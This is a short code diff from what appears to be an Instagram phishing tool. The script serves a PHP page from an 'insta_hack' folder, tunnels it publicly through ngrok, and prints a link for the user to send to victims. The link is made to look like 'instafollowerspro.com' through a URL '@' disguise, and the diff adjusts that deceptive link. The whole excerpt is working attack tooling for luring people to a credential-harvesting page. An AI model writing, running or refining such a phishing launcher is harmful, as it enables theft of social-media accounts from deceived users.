@@ -11,5 +11,5 @@ with open("server","w") as phplog:
     Popen(("php","-S","localhost:4040","-t","insta_hack"),stderr=phplog ,stdout=phplog)
 link=ngrok.connect(4040,"http")
 print(link)
-print(Fore.GREEN+" youcan send link :https://www.instafollowerspro.com@-yourlink")
+print(Fore.GREEN+" youcan send link :https://www.instafollowerspro.com-@yourlink")
 input("")
